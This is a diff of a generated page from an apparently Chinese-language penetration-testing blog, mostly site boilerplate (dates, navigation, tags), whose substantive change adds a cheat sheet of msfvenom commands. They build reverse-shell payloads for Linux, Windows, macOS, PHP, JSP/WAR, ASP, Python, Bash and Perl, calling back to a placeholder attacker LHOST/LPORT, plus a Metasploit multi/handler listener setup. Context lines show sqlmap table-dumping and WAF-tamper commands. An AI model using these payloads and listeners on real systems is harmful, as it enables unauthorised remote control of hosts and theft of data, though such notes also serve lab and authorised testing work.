@@ -46,10 +46,10 @@
         content="article">
       <meta 
         property="og:article:published_time" 
-        content="2021-12-23">
+        content="2021-12-02">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-23">
+        content="2021-12-30">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -306,12 +306,12 @@
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-12-23T09:11:02.001Z">
+    <time datetime="2021-12-01T16:00:00.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
       </i>
-      <span>2021-12-23</span>
+      <span>2021-12-02</span>
     </time>
     
       <span class="dot"></span>
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>1.6k words</span>
+      <span>2k words</span>
     
   </div>
   
@@ -369,6 +369,53 @@
 <h3 id="u5B57_u6BB5_u5185_u5BB9"><a href="#u5B57_u6BB5_u5185_u5BB9" class="headerlink" title="字段内容"></a>字段内容</h3><p><code>sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column1,column2…&gt; --dump --batch</code>  </p>
 <h3 id="u8BD5_u63A2WAF"><a href="#u8BD5_u63A2WAF" class="headerlink" title="试探WAF"></a>试探WAF</h3><p><code>sqlmap -u &lt;url&gt; --identify-waf --batch</code>  </p>
 <h3 id="tamper_u811A_u672C"><a href="#tamper_u811A_u672C" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><p><code>sqlmap -u &lt;url&gt; --tamper &lt;模块名&gt;</code><br>脚本位置：<strong>~/sqlmap/tamper</strong>  </p>
+</blockquote>
+<h2 id="Msfvenom__u53CD_u5F39shell"><a href="#Msfvenom__u53CD_u5F39shell" class="headerlink" title="Msfvenom 反弹shell"></a>Msfvenom 反弹shell</h2><blockquote>
+<h3 id="PayLoads_List"><a href="#PayLoads_List" class="headerlink" title="PayLoads List"></a>PayLoads List</h3><h4 id="Binaries_Payloads"><a href="#Binaries_Payloads" class="headerlink" title="Binaries Payloads"></a>Binaries Payloads</h4><blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#[Linux]  </span>
+msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f elf -o shell.elf   
+<span class="token comment">#[Windows]  </span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f exe -o shell.exe  
+<span class="token comment">#[Mac]  </span>
+msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f macho -o shell.macho  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h4 id="Web_Payloads"><a href="#Web_Payloads" class="headerlink" title="Web Payloads"></a>Web Payloads</h4><blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#[PHP->.php]  </span>
+msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -o shell.php  
+<span class="token comment">#[JAVA->.jar]  </span>
+msfvenom -p java/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f jar -o shell.jar  
+<span class="token comment">#[ASP->.asp]  </span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f asp -o shell.asp  
+<span class="token comment">#[JSP->.jsp]  </span>
+msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -o shell.jsp  
+<span class="token comment">#[JSP->.war]  </span>
+msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f war -o shell.war  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h4 id="Scripting_Payloads"><a href="#Scripting_Payloads" class="headerlink" title="Scripting Payloads"></a>Scripting Payloads</h4><blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#[Python]  </span>
+msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw -o shell.py  
+<span class="token comment">#[Bash]  </span>
+msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw -o shell.sh  
+<span class="token comment">#[Perl]  </span>
+msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw -o shell.pl  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h4 id="ShellCode_Payloads"><a href="#ShellCode_Payloads" class="headerlink" title="ShellCode Payloads"></a>ShellCode Payloads</h4><blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#[Linux Based Shellcode]  </span>
+msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span>  
+<span class="token comment">#[Windows Based Shellcode]  </span>
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span>  
+<span class="token comment">#[Mac Based Shellcode]  </span>
+msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f <span class="token operator">&lt;</span>language<span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h3 id="u76D1_u542C-getshell"><a href="#u76D1_u542C-getshell" class="headerlink" title="监听-getshell"></a>监听-getshell</h3><blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole  
+use exploit/multi/handler  
+<span class="token builtin class-name">set</span> payload <span class="token operator">&lt;</span>payload<span class="token operator">></span>  
+<span class="token builtin class-name">set</span> lhost <span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span>  
+<span class="token builtin class-name">set</span> lport <span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span>  
+run  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里的触发条件要是实际情况而定，有的是直接访问对应页面，有的是直接在前端对上传文件进行操作而触发。  </p>
+</blockquote>
 </blockquote>
 <h2 id="u8681_u5251"><a href="#u8681_u5251" class="headerlink" title="蚁剑"></a>蚁剑</h2><blockquote>
 <p><strong>数据管理-右键-添加数据</strong>  </p>
@@ -551,13 +598,13 @@
   
     <div class="nav-item-prev">
       <a 
-        href="/238e957d.html" 
+        href="/a8b692c1.html" 
         class="nav-link">
         <i class="iconfont icon-left nav-prev-icon"></i>
         <div>
           <div class="nav-label">Prev</div>
           
-            <div class="nav-title">Vulnhub|Questions </div>
+            <div class="nav-title">Vulnhub|Os-hackNos </div>
           
         </div>
       </a>
@@ -566,12 +613,12 @@
   
     <div class="nav-item-next">
       <a 
-        href="/75811fbe.html" 
+        href="/6ceb590b.html" 
         class="nav-link">
         <div>
           <div class="nav-label">Next</div>
           
-            <div class="nav-title">getshell </div>
+            <div class="nav-title">Vulnhub|Me and My Girlfriend </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -589,7 +636,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom__u53CD_u5F39shell"><span class="toc-text">Msfvenom 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PayLoads_List"><span class="toc-text">PayLoads List</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Binaries_Payloads"><span class="toc-text">Binaries Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web_Payloads"><span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scripting_Payloads"><span class="toc-text">Scripting Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ShellCode_Payloads"><span class="toc-text">ShellCode Payloads</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76D1_u542C-getshell"><span class="toc-text">监听-getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -608,7 +655,7 @@
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>22</span>
+    <span>24</span>
     <span>Posts</span>
   </a>
   <a 
@@ -620,7 +667,7 @@
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>22</span>
+    <span>24</span>
     <span>Tags</span>
   </a>
 </div>
@@ -653,7 +700,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom__u53CD_u5F39shell"><span class="toc-text">Msfvenom 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PayLoads_List"><span class="toc-text">PayLoads List</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Binaries_Payloads"><span class="toc-text">Binaries Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web_Payloads"><span class="toc-text">Web Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Scripting_Payloads"><span class="toc-text">Scripting Payloads</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ShellCode_Payloads"><span class="toc-text">ShellCode Payloads</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76D1_u542C-getshell"><span class="toc-text">监听-getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -671,7 +718,7 @@
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">18</span>
+          <span class="categories-list-item-badge">20</span>
         </div>
       </a>
     
@@ -704,15 +751,15 @@
   <div class="tags-list">
     
       <a 
-        href="/tags/%E6%8F%90%E6%9D%83/" 
-        title="提权">
-        <div class="tags-list-item">提权</div>
-      </a>
-    
-      <a 
         href="/tags/Vulnhub/" 
         title="Vulnhub">
         <div class="tags-list-item">Vulnhub</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
       </a>
     
       <a 
@@ -752,6 +799,18 @@
       </a>
     
       <a 
+        href="/tags/Flink/" 
+        title="Flink">
+        <div class="tags-list-item">Flink</div>
+      </a>
+    
+      <a 
+        href="/tags/Tomcat/" 
+        title="Tomcat">
+        <div class="tags-list-item">Tomcat</div>
+      </a>
+    
+      <a 
         href="/tags/FileUpload/" 
         title="FileUpload">
         <div class="tags-list-item">FileUpload</div>
@@ -787,18 +846,6 @@
         <div class="tags-list-item">http-methods</div>
       </a>
     
-      <a 
-        href="/tags/SSH%E7%88%86%E7%A0%B4/" 
-        title="SSH爆破">
-        <div class="tags-list-item">SSH爆破</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83/" 
-        title="水平越权">
-        <div class="tags-list-item">水平越权</div>
-      </a>
-    
   </div>
 </div>
   </article>
@@ -817,7 +864,7 @@
     style="padding-right: 2px;">
   </i>TOC
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u6570_u636E_u5E93_u540D"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u8868_u540D"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7206_u5B57_u6BB5_u540D"><span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u5B57_u6BB5_u5185_u5BB9"><span class="toc-text">字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8BD5_u63A2WAF"><span class="toc-text">试探WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper_u811A_u672C"><span class="toc-text">tamper脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#u8681_u5251"><span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely"><span class="toc-text">weevely</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u751F_u6210_u540E_u95E8"><span class="toc-text">生成后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u8FDE_u63A5_u540E_u95E8"><span class="toc-text">连接后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5Bcmd_5D"><span class="toc-text">[cmd]</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u5E38_u7528"><span class="toc-text">常用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u76EE_u6807_u8BF4_u660E"><span class="toc-text">目标说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u4E3B_u673A_u53D1_u73B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u626B_u63CF_u6280_u672F"><span class="toc-text">扫描技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u7AEF_u53E3_u8BF4_u660E_u548C_u626B_u63CF_u89C4_u5219"><span class="toc-text">端口说明和扫描规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u670D_u52A1_u3001_u7248_u672C_u63A2_u6D4B"><span class="toc-text">服务、版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u811A_u672C_u626B_u63CF"><span class="toc-text">脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#u9632_u706B_u5899_u3001IDS_u7ED5_u8FC7_u548C_u6B3A_u9A97"><span class="toc-text">防火墙、IDS绕过和欺骗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a><ol class="toc-child"><li class="toc-item 